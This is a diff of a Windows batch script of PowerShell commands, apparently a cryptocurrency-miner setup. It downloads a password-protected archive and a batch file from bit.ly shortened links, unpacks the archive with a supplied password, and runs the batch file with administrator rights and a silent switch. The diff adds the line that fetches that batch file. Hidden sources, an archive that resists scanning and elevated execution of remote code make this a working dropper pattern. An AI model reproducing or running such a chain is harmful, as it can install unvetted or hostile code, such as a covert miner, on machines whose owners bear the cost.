@@ -18,6 +18,7 @@ PowerShell -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentLi
 PowerShell -Command "Invoke-WebRequest -Uri "https://bit.ly/2miners-github" -OutFile "C:\setup.rar"' -OutFile 'C:\setup.rar'"
 PowerShell -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -p2miners 'C:\setup.rar' 'C:\' -Wait"
 PowerShell -Command "Start-Sleep -Seconds 10"
+PowerShell -Command "Invoke-WebRequest -Uri "https://bit.ly/zeph-pool" -OutFile "C:\zeph-pool.bat""
 PowerShell -Command "Copy-Item -Path "C:\zeph-pool.bat" -Destination "C:\Setup\Zephyr\zeph-pool.bat" -Force"
 PowerShell -Command "Start-Process -FilePath 'C:\Setup\Zephyr\zeph-pool.bat' -ArgumentList '/S' -Verb RunAs"
 exit
